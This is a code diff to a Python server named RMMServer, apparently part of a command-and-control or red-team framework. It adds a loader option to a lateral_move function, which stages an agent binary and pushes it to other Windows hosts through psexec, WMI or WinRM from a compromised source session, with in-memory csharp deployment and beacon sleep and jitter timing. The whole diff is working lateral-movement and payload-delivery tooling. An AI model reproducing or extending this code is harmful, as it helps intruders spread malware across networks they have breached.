@@ -131,6 +131,10 @@ MAKE_TOKEN_OK_PREFIXES = ("token created:", "token replaced:")
 LATERAL_COMMAND = "__LATERAL__"
 UID_COMMAND = "__UID__"
 LATERAL_METHODS = frozenset({"psexec", "wmiexec", "winrm"})
+# Single-loader release: csharp deploys in memory; powershell stays a
+# reserved value on every surface so a later release ships without an API
+# shape change.
+LATERAL_LOADERS = frozenset({"csharp", "powershell"})
 LATERAL_RESULT_RE = re.compile(r"target session=(?P<session_id>[A-Za-z0-9_-]{8,128})")
 # The psexec handshake also carries the deployment names the cleanup
 # command must remove on the target.
@@ -3352,7 +3356,8 @@ class RMMServer:
         return {"ok": True, "session_id": session.id, "identity": identity, "output": body}, "ok"
 
     def lateral_move(self, session_id_or_prefix, method, host, verify=True,
-                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, https=False, insecure=False):
+                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, https=False, insecure=False,
+                     loader="csharp"):
         """Request remote execution using the source agent's compiled debug mode."""
         session = self.resolve_session(session_id_or_prefix)
         if not session:
@@ -3368,10 +3373,17 @@ class RMMServer:
             return None, "invalid_https"
         if not isinstance(insecure, bool) or (insecure and not https):
             return None, "invalid_insecure"
+        if not isinstance(loader, str) or (loader or "").strip().lower() not in LATERAL_LOADERS:
+            return None, "invalid_loader"
+        if (loader or "").strip().lower() == "powershell":
+            # Reserved for a later release: fail with an explicit error
+            # instead of silently substituting the default csharp loader.
+            return None, "loader_reserved"
         if not host:
             return None, "invalid_host"
         target_id = self._new_deployment_id("lateral")
         stage_id = ""
+        payload_sha256 = ""
         if method == "psexec":
             # The listener stages the agent build that belongs to the source
             # session's workspace; stage1 fetches it with the staging
@@ -3387,18 +3399,48 @@ class RMMServer:
             except OSError as exc:
                 self.log(f"Staging the agent payload failed: {exc}", "WARNING")
                 return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
-        # Reserve response time for delivery and the final result instead of
-        # expiring the worker and its server waiter at the same instant.
-        worker_timeout = float(exec_timeout)
+        else:
+            # WMI and WinRM loader deployments stream a server-selected,
+            # workspace-owned artifact through the source agent instead of
+            # deploying the source binary: the deployment no longer depends
+            # on the source session's hosting mode.
+            owner = getattr(session, "workspace_id", None) or ""
+            agent_binary = (latest_go_agent_binary(debug=True, workspace_id=owner) if debug
+                            else latest_go_agent_binary(workspace_id=owner))
+            if not agent_binary:
+                return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
+            try:
+                with open(agent_binary, "rb") as handle:
+                    artifact = handle.read()
+            except OSError as exc:
+                self.log(f"Reading the agent payload for staging failed: {exc}", "WARNING")
+                return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
+            payload_sha256 = hashlib.sha256(artifact).hexdigest()
+            stage_id = self.create_staging(artifact)
+        # Loader deployments use dedicated wire-method names so older agents
+        # reject the request instead of ignoring the new fields and silently
+        # deploying a copy of their own binary.
         if method == "psexec":
+            wire_method = method
+        else:
+            wire_method = ("winrm_https_insecure" if insecure else "winrm_https" if https else method) + "_loader"
+        # Reserve response time for delivery and the final result instead of
+        # expiring the worker and its server waiter at the same instant. Every
+        # staged method now fetches its artifact before the transport runs,
+        # so all of them share the beacon delivery allowance.
+        worker_timeout = float(exec_timeout)
+        if stage_id:
             delivery_budget = float(getattr(session, "sleep_seconds", 60)) * (
                 1 + float(getattr(session, "jitter_percent", 30)) / 100) + 15
             worker_timeout -= min(delivery_budget, worker_timeout / 2)
         command = LATERAL_COMMAND + "\n" + json.dumps({
-            "method": "winrm_https_insecure" if insecure else "winrm_https" if https else method, "host": host, "timeout_seconds": worker_timeout,
+            "method": wire_method, "host": host, "timeout_seconds": worker_timeout,
             "session_id": target_id, "workspace_id": getattr(session, "workspace_id", None) or "",
-            "stage": stage_id, **({"https": True} if https else {}), **({"insecure": True} if insecure else {})}, separators=(",", ":"))
-        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}" + (" -s" if https else "") + (" -k" if insecure else ""), "lateral")
+            "stage": stage_id,
+            **({"loader": "csharp"} if method != "psexec" else {}),
+            **({"payload_sha256": payload_sha256} if method != "psexec" else {}),
+            **({"https": True} if https else {}), **({"insecure": True} if insecure else {})}, separators=(",", ":"))
+        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}" + (" -s" if https else "") + (" -k" if insecure else "") + (f" loader={loader}" if method != "psexec" else ""), "lateral")
         event, status = self.exec_and_wait(session.id, command, timeout=exec_timeout)
         if status not in ("ok", "timeout"):
             return None, status
@@ -3410,6 +3452,7 @@ class RMMServer:
         binary_match = LATERAL_BINARY_RE.search(output)
         payload = {"session_id": session.id, "method": method, "host": host,
                    "debug": debug,
+                   **({"loader": loader} if method != "psexec" else {}),
                    "target_session_id": target_id, "output": output,
                    "launch_status": "acknowledged" if acknowledged else "failed" if failed else "inconclusive", "submission_status": status}
         payload, verify_status = self._verify_deployment(session, target_id, payload, verify, register_timeout)
@@ -5607,6 +5650,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout = float(body.get("exec_timeout", 300))
                 https = body.get("https", False)
                 insecure = body.get("insecure", False)
+                loader = body.get("loader", "csharp")
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
@@ -5618,6 +5662,8 @@ class RMMHandler(BaseHTTPRequestHandler):
                     raise ValueError("https must be a boolean")
                 if not isinstance(insecure, bool):
                     raise ValueError("insecure must be a boolean")
+                if not isinstance(loader, str):
+                    raise ValueError("loader must be a string")
             except (TypeError, ValueError):
                 self._json(400, {"error": "invalid_lateral_options"})
                 return True
@@ -5629,6 +5675,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout=exec_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
+                loader=loader,
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
             )
@@ -5636,8 +5683,12 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(404, {"error": "session_not_found"})
             elif status in ("agent_type_unsupported", "session_busy"):
                 self._json(409, {"error": status})
-            elif status in ("invalid_method", "invalid_host", "invalid_https", "invalid_insecure"):
+            elif status in ("invalid_method", "invalid_host", "invalid_https",
+                            "invalid_insecure", "invalid_loader"):
                 self._json(400, {"error": status})
+            elif status == "loader_reserved":
+                self._json(400, {"error": status,
+                                 "detail": "The powershell loader is reserved for a later release; use the default csharp loader."})
             elif status == "agent_payload_unavailable":
                 self._json(503, {"error": status,
                                  "detail": "No Windows agent build is staged on the server; run build_go_agent first."})
